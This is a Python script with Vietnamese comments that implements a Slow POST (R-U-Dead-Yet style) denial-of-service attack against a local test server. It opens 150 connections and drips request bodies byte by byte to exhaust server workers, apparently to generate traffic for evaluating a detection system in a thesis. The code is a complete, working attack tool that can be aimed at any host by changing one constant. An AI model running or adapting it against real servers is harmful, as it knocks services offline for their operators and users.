"""
experiments/attack_slow_post.py
CHỈ dùng để tấn công server localhost trong testbed của chính bạn.

4.1.2 - Slow POST (kiểu R-U-Dead-Yet): gửi header đầy đủ (Content-Length lớn)
nhưng nhỏ giọt body cực chậm để giữ connection/worker bị chiếm giữ lâu.

Khác với Slowloris (không log được vì header chưa hoàn tất), Slow POST CÓ được
ghi log ở tầng ứng dụng (vì header đã đủ để middleware bắt được request), nhưng
request_rate vẫn thấp trong khi tài nguyên server (CPU/RAM, connection đang mở)
tăng dần - đây là ví dụ tốt để minh hoạ hạn chế: bộ 4 đặc trưng hiện tại không
có đặc trưng nào phản ánh "connection duration" hay "số connection đang treo",
nên đặc trưng dựa trên rate có thể không đủ để phát hiện dạng tấn công này -
điểm thảo luận giá trị cho 4.5.

Chạy: python experiments/attack_slow_post.py
"""
import random
import socket
import time
from pathlib import Path

TARGET_HOST = "localhost"
TARGET_PORT = 8000
NUM_SOCKETS = 150
DURATION_S = 40
BODY_LEN = 5000  # Content-Length khai báo, nhưng gửi rất chậm

LOG_DIR = Path(__file__).resolve().parent.parent / "logs"
LOG_DIR.mkdir(exist_ok=True)


def init_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((TARGET_HOST, TARGET_PORT))
    headers = (
        f"POST /cart?product_id={random.randint(1, 50)} HTTP/1.1\r\n"
        f"Host: {TARGET_HOST}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {BODY_LEN}\r\n"
        f"\r\n"
    )
    s.send(headers.encode())
    return s


def main():
    start = time.time()
    with open(LOG_DIR / "attack_start.log", "a") as f:
        f.write(f"slow_post_start\t{start}\n")

    sockets = []
    for _ in range(NUM_SOCKETS):
        try:
            sockets.append(init_socket())
        except OSError:
            pass

    print(f"Đã mở {len(sockets)} kết nối slow POST, nhỏ giọt body trong {DURATION_S}s")

    stop_at = time.time() + DURATION_S
    sent_bytes = {id(s): 0 for s in sockets}
    while time.time() < stop_at:
        for s in list(sockets):
            try:
                if sent_bytes[id(s)] < BODY_LEN:
                    s.send(b"a")
                    sent_bytes[id(s)] += 1
            except OSError:
                sockets.remove(s)
        time.sleep(2)  # nhỏ giọt 1 byte mỗi ~2s mỗi connection

    for s in sockets:
        try:
            s.close()
        except OSError:
            pass
    print("Slow POST kết thúc")


if __name__ == "__main__":
    main()
